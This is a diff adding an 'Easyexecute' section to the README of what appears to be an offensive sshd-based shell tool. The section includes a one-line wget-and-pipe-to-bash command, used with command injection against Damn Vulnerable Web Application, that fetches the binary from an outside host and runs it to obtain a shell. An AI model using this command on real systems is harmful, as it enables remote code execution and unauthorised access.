@@ -55,6 +55,16 @@ account has an invalid shell, etc.
 
 You shall receive a shell with the priviledges of the account running sshd
 
+## Easyexecute
+
+patch the binary to make it a bash script that will chmod +x itself
+easyexecute.py sshd
+then sshd can be piped into bash, see example below
+
+Basic example for Damn Vulnerable Web Application (command injection):
+
+`export ARGS="-s 192.168.122.1 -p 8022"; cd /tmp; wget -r http://192.168.122.1:8080/sshd -O sshd && cat sshd | bash`
+
 INSTALL has more detailed compilation instructions.
 
 
